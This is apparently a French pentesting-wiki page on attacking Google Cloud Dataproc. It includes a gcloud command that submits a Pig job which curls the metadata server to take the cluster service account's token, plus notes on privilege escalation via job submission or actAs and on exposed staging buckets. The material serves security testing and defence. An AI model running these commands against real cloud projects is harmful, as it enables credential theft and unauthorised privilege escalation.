---
title: "Dataproc : le compte de service du cluster et la soumission de jobs"
order: 4
description: "Attaquer les clusters Dataproc : le compte de service du cluster, la soumission de jobs et l'accès aux données stagées."
keywords:
  - Dataproc
  - cluster
  - job submission
  - service account
  - Hadoop
  - Spark
---

# Dataproc

Dataproc exécute des clusters Hadoop et Spark managés. Les VM de chaque cluster portent un **compte de service** (celui par défaut de Compute Engine ou un compte personnalisé), et quiconque peut soumettre un job exécute du code arbitraire sur ces VM sous l'identité de ce compte, ce qui fait de la soumission de jobs à la fois un chemin d'accès aux données et un chemin d'élévation de privilèges.

## Soumettre un job sur un cluster existant

```bash
gcloud dataproc clusters list --region <region>
# run arbitrary code as the cluster service account
gcloud dataproc jobs submit pig --cluster <c> --region <region> \
  -e 'sh("curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")'
```

## Notes d'exploitation

- `dataproc.jobs.create` sur un cluster doté d'un compte de service privilégié constitue l'élévation ; créer un nouveau cluster avec un `--service-account` choisi est la variante [actAs](../identity/privilege-escalation/act-as-deployment/dataproc.md).
- Les clusters stagent des données dans des buckets GCS et lisent les données sources vers lesquelles pointe le job ; le bucket de staging est souvent largement accessible en lecture.
- Un job Spark ou Pig donne un shell sur le worker, de sorte que le serveur de métadonnées du nœud et tous les secrets montés sont à portée.

## Outils

- **gcloud** (`dataproc clusters list`, `dataproc jobs submit`).

## Références

- [HackTricks Cloud: GCP Dataproc](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs: GCP IAM privilege escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google Cloud: Dataproc service accounts](https://cloud.google.com/dataproc/docs/concepts/configuring-clusters/service-accounts)
